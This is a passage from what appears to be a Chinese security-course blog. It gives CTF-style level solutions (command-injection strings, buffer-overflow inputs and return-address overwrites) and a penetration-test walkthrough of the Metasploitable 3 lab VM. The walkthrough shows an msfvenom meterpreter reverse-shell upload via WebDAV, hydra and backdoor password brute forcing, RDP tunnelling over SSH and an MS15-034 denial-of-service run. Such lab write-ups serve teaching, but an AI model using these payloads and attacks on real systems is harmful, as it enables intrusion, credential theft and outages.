src="https://s2.loli.net/2021/12/17/YIGEpuAU2cn3bm6.png" alt="13"></p><h1>Level14</h1><ol><li>运行flag14，观察发现加密算法是 str[i] += i;</li><li>将加密的token进行解密，得到 318d229.998d.5f</li><li>登录flag14，获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/WIqh7TVeHaybcUL.png" alt="14"></p><h1>Level16</h1><ol><li><p>编写脚本 /tmp/getflag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">/bin/getflag16 &gt; /tmp/flag</span><br></pre></td></tr></table></figure></li><li><p>写一个html表单，在username中提交 &quot;;a=/tmp/getflag;${a,};</p></li><li><p>查看 /tmp/flag 获得 flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/IKbFR3rsEUimOtk.png" alt="16"></p><h1>level19</h1><ol><li><p>编写脚本，fork一个子进程，然后父进程退出，子进程执行 /home/flag19/flag19</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">char</span>* args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/getflag19&gt;/tmp/flag_19&quot;</span>, <span class="literal">NULL</span>&#125;;  </span><br><span class="line">    <span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">         execve(<span class="string">&quot;/home/flag19/flag19&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;编译链接执行，查看输出获得flag</span><br></pre></td></tr></table></figure></li><li><p>编译链接执行，查看输出获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/JHGR3MuEAkh9mFn.png" alt="19"></p><h1>Level20</h1><ol><li><p>输入65个’a’给flag20程序，造成数组越界，修改modified的值不为0，获得flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..64&#125;;<span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&#x27;a&#x27;</span> &gt;&gt; /tmp/overflow20;<span class="keyword">done</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /tmp/overflow20 | ./flag20</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/23twKc1QB9SWaVn.png" alt="20"></p><h1>Level21</h1><ol><li><p>越界后修改modified为0x56575859 (也就是 VWXY)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./flag21 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYXWV</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/Fb864t9OyxkKpe7.png" alt="21"></p><h1>Level22</h1><ol><li><p>编写添加环境变量的脚本 /tmp/atk22.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;export NJUCS=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&#x27;&quot;</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译运行，将输出结果添加到 ~/.bashrc 中，刷新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc /tmp/atk22.c -o /tmp/atck22$ /tmp/atk22 &gt;&gt; ~/.bashrc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>运行 ./flag22 ，获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/Oswi9ESBJHWjD2h.png" alt="22"></p><h1>Level23</h1><ol><li><p>(gdb) x win 查看win函数地址，为 0x804846b</p></li><li><p>编写/tmp/atk23.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&quot;</span>, <span class="number">0x6b</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构造payload，运行</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/a4OvYFqQZA1uxRP.png" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次完整的渗透测试</title>
      <link href="/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>靶机：metasploitable 3，有许多漏洞供练习，并藏有15个隐藏彩蛋，老师发的镜像删去了部分有损坏的flag</p><h1>一、信息搜集阶段</h1><ol><li><p>通过nmap扫描发现window靶机的ip地址<code>10.0.2.4</code>，PS：kali攻击机ip：10.0.2.15</p></li><li><p>启动msfconfig，使用nmap扫描全端口，发现靶机开启了如下端口，及其服务版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; workspace -a win08-r2</span><br><span class="line">[*] Added workspace: win08-r2</span><br><span class="line">[*] Workspace: win08-r2</span><br><span class="line">msf &gt; db_nmap -sS -sV -sC -p- -n -v 10.0.2.4</span><br><span class="line">msf &gt; services </span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line">host      port   proto  name        state  info</span><br><span class="line">----      ----   -----  ----        -----  ----</span><br><span class="line">10.0.2.4  21     tcp    ftp         open   Microsoft ftpd</span><br><span class="line">10.0.2.4  22     tcp    ssh         open   OpenSSH 7.1 protocol 2.0</span><br><span class="line">10.0.2.4  80     tcp    http        open   Microsoft IIS httpd 7.5</span><br><span class="line">10.0.2.4  1617   tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  3000   tcp    http        open   WEBrick httpd 1.3.1 Ruby 2.3.1 (</span><br><span class="line">                                           2016-04-26)</span><br><span class="line">10.0.2.4  4848   tcp    ssl/http    open   Oracle Glassfish Application Ser</span><br><span class="line">                                           ver</span><br><span class="line">10.0.2.4  5985   tcp    http        open   Microsoft HTTPAPI httpd 2.0 SSDP</span><br><span class="line">                                           /UPnP</span><br><span class="line">10.0.2.4  8022   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8080   tcp    http        open   Sun GlassFish Open Source Editio</span><br><span class="line">                                           n  4.0</span><br><span class="line">10.0.2.4  8282   tcp    http        open   Apache Tomcat/Coyote JSP engine</span><br><span class="line">                                           1.1</span><br><span class="line">10.0.2.4  8484   tcp    http        open   Jetty winstone-2.8</span><br><span class="line">10.0.2.4  8585   tcp    http        open   Apache httpd 2.2.21 (Win64) PHP/</span><br><span class="line">                                           5.3.10 DAV/2</span><br><span class="line">10.0.2.4  9200   tcp    wap-wsp     open</span><br><span class="line">10.0.2.4  49153  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49154  tcp    msrpc       open   Microsoft Windows RPC</span><br><span class="line">10.0.2.4  49179  tcp    java-rmi    open   Java RMI</span><br><span class="line">10.0.2.4  49180  tcp    tcpwrapped  open</span><br></pre></td></tr></table></figure></li></ol><h1>二、漏洞分析与利用阶段</h1><h2 id="（1）WebDAV服务漏洞"><a class="header-anchor" href="#（1）WebDAV服务漏洞">¶</a>（1）WebDAV服务漏洞</h2><p>通过kali提供的WebDAV服务漏洞利用工具DAVTest。该工具会自动检测权限，寻找可执行文件的权限。一旦发现，用户就可以上传内置的后门工具，对服务器进行控制。同时，该工具可以上传用户指定的文件，便于后期利用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root💀kali)-[~]</span><br><span class="line">└─# davtest -url http://10.0.2.4:8585/uploads/                                                              </span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line">NOTE    Random string for this session: TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Creating directory</span><br><span class="line">MKCOL           SUCCEED:                Created http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb</span><br><span class="line">********************************************************</span><br><span class="line"> Sending test files</span><br><span class="line">PUT     php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">PUT     cgi     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cgi</span><br><span class="line">PUT     shtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.shtml</span><br><span class="line">PUT     jhtml   SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jhtml</span><br><span class="line">PUT     aspx    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.aspx</span><br><span class="line">PUT     jsp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.jsp</span><br><span class="line">PUT     html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">PUT     txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">PUT     pl      SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.pl</span><br><span class="line">PUT     asp     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.asp</span><br><span class="line">PUT     cfm     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.cfm</span><br><span class="line">********************************************************</span><br><span class="line"> Checking for test file execution</span><br><span class="line">EXEC    php     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.php</span><br><span class="line">EXEC    cgi     FAIL</span><br><span class="line">EXEC    shtml   FAIL</span><br><span class="line">EXEC    jhtml   FAIL</span><br><span class="line">EXEC    aspx    FAIL</span><br><span class="line">EXEC    jsp     FAIL</span><br><span class="line">EXEC    html    SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.html</span><br><span class="line">EXEC    txt     SUCCEED:        http://10.0.2.4:8585/uploads/DavTestDir_TUv6QRb/davtest_TUv6QRb.txt</span><br><span class="line">EXEC    pl      FAIL</span><br><span class="line">EXEC    asp     FAIL</span><br><span class="line">EXEC    cfm     FAIL</span><br></pre></td></tr></table></figure><p>检测发现可以上传php文件</p><p>生成攻击载荷并上传：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=6666 -f raw &gt;demon.php</span><br><span class="line"></span><br><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ davtest -url http://10.0.2.4:8585/uploads/ -uploadfile demon.php -uploadloc DavTestDir_12ja05EL/66.php</span><br><span class="line">********************************************************</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPEN            SUCCEED:                http://10.0.2.4:8585/uploads</span><br><span class="line">********************************************************</span><br><span class="line"> unless  Uploading file</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.0.2.15</span><br><span class="line">LHOST =&gt; 10.0.2.15</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 8888</span><br><span class="line">LPORT =&gt; 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.2.15:8888 </span><br><span class="line">[*] Meterpreter session 1 opened (10.0.2.15:8888 -&gt; 10.0.2.4:49914 ) at 2021-12-22 06:41:03 -0500</span><br></pre></td></tr></table></figure><p>得到Meterpreter，成功！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    detach                    Detach the meterpreter session (for http/https)</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br></pre></td></tr></table></figure><h2 id="（2）ssh测试"><a class="header-anchor" href="#（2）ssh测试">¶</a>（2）ssh测试</h2><ol><li><p>首先，通过hydra进行密码爆破，得到Administrator账号密码：admin321，即可建立ssh链接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ ssh Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">-sh-4.3$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>检测3389端口，发现端口是打开的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ nmap -p 3389 10.0.2.4                                                                     </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-17 01:57 EST</span><br><span class="line">Nmap scan report for 10.0.2.4</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">3389/tcp filtered ms-wbt-server</span><br><span class="line">MAC Address: 08:00:27:0B:0C:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</span><br></pre></td></tr></table></figure></li><li><p>端口转发，并进行连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(root💀kali)-[~]</span><br><span class="line">└─$ ssh -L 3389:localhost:3389 Administrator@10.0.2.4</span><br><span class="line">Administrator@10.0.2.4&#x27;s password: </span><br><span class="line">Last login: Thu Dec 16 22:54:07 2021 from 10.0.2.15</span><br><span class="line">-sh-4.3$ </span><br><span class="line">(kali㉿kali)-[~]</span><br><span class="line">└─$ rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/QcGxjgtXmf9631H.png" alt="desktop"></p></li><li><p>实现可以直接在kali攻击机上进行对靶机的操作</p></li></ol><p>（3）caidao</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search caidao</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                            Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/caidao_php_backdoor_exec     2015-10-27       excellent  Yes    China Chopper Caidao PHP Backdoor Code Execution</span><br><span class="line">   1  auxiliary/scanner/http/caidao_bruteforce_login                   normal     No     Chinese Caidao Backdoor Bruteforce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/caidao_bruteforce_login                                                                                                        </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/scanner/http/caidao_bruteforce_login</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; set TARGETURI /caidao.asp</span><br><span class="line">TARGETURI =&gt; /caidao.asp</span><br><span class="line">msf6 auxiliary(scanner/http/caidao_bruteforce_login) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;admin&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;12345&#x27;</span><br><span class="line">[-] 10.0.2.4:80 - Failed: &#x27;123456789&#x27;</span><br><span class="line">[+] 10.0.2.4:80 - Success: &#x27;password&#x27;</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>找到连接口令：‘password’</p><h2 id="（4）80端口–http"><a class="header-anchor" href="#（4）80端口–http">¶</a>（4）80端口–http</h2><p>MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞（远程蓝屏代码）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms15_034</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                  Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                                  ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/dos/http/ms15_034_ulonglongadd                               normal  Yes    MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service</span><br><span class="line">   1  auxiliary/scanner/http/ms15_034_http_sys_memory_dump                   normal  Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/ms15_034_http_sys_memory_dump                                                                                                  </span><br><span class="line"></span><br><span class="line">msf6 &gt; use auxiliary/dos/http/ms15_034_ulonglongadd </span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; set RHOSTS 10.0.2.4</span><br><span class="line">RHOSTS =&gt; 10.0.2.4</span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/dos/http/ms15_034_ulonglongadd):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     10.0.2.4         yes       The target host(s), see https://github.com/rapid7/metasploit-framewor</span><br><span class="line">                                         k/wiki/Using-Metasploit</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                no        URI to the site (e.g /site/) or a valid file resource (e.g /welcome.p</span><br><span class="line">                                         ng)</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(dos/http/ms15_034_ulonglongadd) &gt; run</span><br><span class="line"></span><br><span class="line">[*] DOS request sent</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 